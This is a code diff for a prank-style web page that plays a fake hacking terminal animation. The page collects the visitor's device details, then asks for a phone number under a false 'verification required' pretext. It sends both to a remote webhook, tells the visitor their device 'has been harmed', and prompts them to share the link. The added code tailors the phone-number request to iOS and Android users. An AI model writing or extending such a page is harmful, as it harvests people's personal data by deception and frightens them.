@@ -47,6 +47,21 @@ function formatPhoneNumber(phoneNumber) {
     return cleaned;
 }
 
+// Function to detect mobile device type
+function getMobileDeviceType() {
+    const userAgent = navigator.userAgent;
+    
+    if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        return 'iOS';
+    } else if (/Android/i.test(userAgent)) {
+        return 'Android';
+    } else if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        return 'Other Mobile';
+    }
+    
+    return 'Desktop';
+}
+
 // Function to get detailed device information
 function getDeviceInfo() {
     const userAgent = navigator.userAgent;
@@ -61,6 +76,7 @@ function getDeviceInfo() {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
     const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
     const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
+    const mobileDeviceType = getMobileDeviceType();
     
     return {
         userAgent,
@@ -75,6 +91,7 @@ function getDeviceInfo() {
         isMobile,
         browser,
         os,
+        mobileDeviceType,
         phoneNumber: userPhoneNumber
     };
 }
@@ -101,7 +118,7 @@ async function sendWebhook() {
                 { name: '🕒 Timestamp', value: deviceInfo.timestamp, inline: true },
                 { name: '🌍 Timezone', value: deviceInfo.timezone, inline: true },
                 { name: '💻 Platform', value: deviceInfo.platform, inline: true },
-                { name: '📱 Device Type', value: deviceInfo.isMobile ? 'Mobile' : 'Desktop', inline: true },
+                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🔍 Screen', value: `${deviceInfo.screenRes} (${deviceInfo.colorDepth})`, inline: true },
                 { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                 { name: '🖥️ OS', value: deviceInfo.os, inline: true },
@@ -194,13 +211,25 @@ document.addEventListener('DOMContentLoaded', () => {
                     // Show fake data found
                     setTimeout(() => {
                         typeWriter(accountLine, '> Data collection complete!', 10, () => {
-                            // Show phone collection message
+                            // Show phone collection message with mobile-specific text
                             setTimeout(() => {
-                                typeWriter(phoneLine, '> Phone verification required...', 10, () => {
+                                const mobileType = getMobileDeviceType();
+                                let phoneMessage = '> Phone verification required...';
+                                
+                                if (mobileType === 'iOS') {
+                                    phoneMessage = '> iOS device detected - Phone verification required...';
+                                } else if (mobileType === 'Android') {
+                                    phoneMessage = '> Android device detected - Phone verification required...';
+                                }
+                                
+                                typeWriter(phoneLine, phoneMessage, 10, () => {
                                     // Show phone input form
                                     setTimeout(() => {
                                         phoneInputContainer.style.display = 'block';
                                         phoneInput.focus();
+                                        
+                                        // Add mobile-specific features
+                                        addMobileFeatures(mobileType);
                                         
                                         // Handle phone submission
                                         phoneSubmit.addEventListener('click', handlePhoneSubmit);
@@ -219,6 +248,59 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }, 500);
     
+    // Function to add mobile-specific features
+    function addMobileFeatures(mobileType) {
+        if (mobileType === 'iOS' || mobileType === 'Android') {
+            // Add mobile-specific input attributes
+            phoneInput.setAttribute('inputmode', 'tel');
+            phoneInput.setAttribute('autocomplete', 'tel');
+            phoneInput.setAttribute('pattern', '[0-9]{8,15}');
+            
+            // Add mobile-specific placeholder text
+            if (mobileType === 'iOS') {
+                phoneInput.placeholder = 'Enter iPhone number';
+            } else if (mobileType === 'Android') {
+                phoneInput.placeholder = 'Enter Android number';
+            }
+        }
+    }
+    
+    // Function to create mobile communication links
+    function createMobileLinks(phoneNumber) {
+        const cleaned = phoneNumber.replace(/\D/g, '');
+        const mobileType = getMobileDeviceType();
+        
+        if (mobileType === 'iOS' || mobileType === 'Android') {
+            const linksContainer = document.createElement('div');
+            linksContainer.className = 'mobile-links';
+            linksContainer.style.marginTop = '15px';
+            
+            // Create call link
+            const callLink = document.createElement('a');
+            callLink.href = `tel:${cleaned}`;
+            callLink.className = 'mobile-link';
+            callLink.textContent = '📞 Call Number';
+            callLink.style.marginRight = '10px';
+            callLink.style.color = '#0f0';
+            callLink.style.textDecoration = 'none';
+            
+            // Create SMS link
+            const smsLink = document.createElement('a');
+            smsLink.href = `sms:${cleaned}`;
+            smsLink.className = 'mobile-link';
+            smsLink.textContent = '💬 Send SMS';
+            smsLink.style.color = '#0f0';
+            smsLink.style.textDecoration = 'none';
+            
+            linksContainer.appendChild(callLink);
+            linksContainer.appendChild(smsLink);
+            
+            return linksContainer;
+        }
+        
+        return null;
+    }
+    
     // Function to handle phone number submission
     function handlePhoneSubmit() {
         const phoneNumber = phoneInput.value.trim();
@@ -232,34 +314,52 @@ document.addEventListener('DOMContentLoaded', () => {
             const successLine = document.createElement('div');
             successLine.className = 'line success';
             terminal.appendChild(successLine);
-            typeWriter(successLine, `> Phone number verified: ${validation.formatted}`, 10, () => {
+            
+            const mobileType = getMobileDeviceType();
+            let successMessage = `> Phone number verified: ${validation.formatted}`;
+            
+            if (mobileType === 'iOS') {
+                successMessage += ' (iOS)';
+            } else if (mobileType === 'Android') {
+                successMessage += ' (Android)';
+            }
+            
+            typeWriter(successLine, successMessage, 10, () => {
                 // Send updated webhook with phone number
                 sendWebhook().then(() => {
-                    // Continue with joke message
+                    // Add mobile-specific links if on mobile device
                     setTimeout(() => {
-                        typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
-                            // Final reveal
-                            setTimeout(() => {
-                                typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
-                                    // Add a share button
-                                    const button = document.createElement('button');
-                                    button.className = 'button';
-                                    button.textContent = 'Made By @Phonzr';
-                                    button.onclick = () => {
-                                        if (navigator.share) {
-                                            navigator.share({
-                                                title: 'Check this out!',
-                                                text: 'I found something interesting!',
-                                                url: window.location.href
-                                            });
-                                        } else {
-                                            alert('Share this link: ' + window.location.href);
-                                        }
-                                    };
-                                    terminal.appendChild(button);
-                                });
-                            }, 1000);
-                        });
+                        const mobileLinks = createMobileLinks(validation.cleaned);
+                        if (mobileLinks) {
+                            terminal.appendChild(mobileLinks);
+                        }
+                        
+                        // Continue with joke message
+                        setTimeout(() => {
+                            typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
+                                // Final reveal
+                                setTimeout(() => {
+                                    typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
+                                        // Add a share button
+                                        const button = document.createElement('button');
+                                        button.className = 'button';
+                                        button.textContent = 'Made By @Phonzr';
+                                        button.onclick = () => {
+                                            if (navigator.share) {
+                                                navigator.share({
+                                                    title: 'Check this out!',
+                                                    text: 'I found something interesting!',
+                                                    url: window.location.href
+                                                });
+                                            } else {
+                                                alert('Share this link: ' + window.location.href);
+                                            }
+                                        };
+                                        terminal.appendChild(button);
+                                    });
+                                }, 1000);
+                            });
+                        }, 1000);
                     }, 1000);
                 });
             });
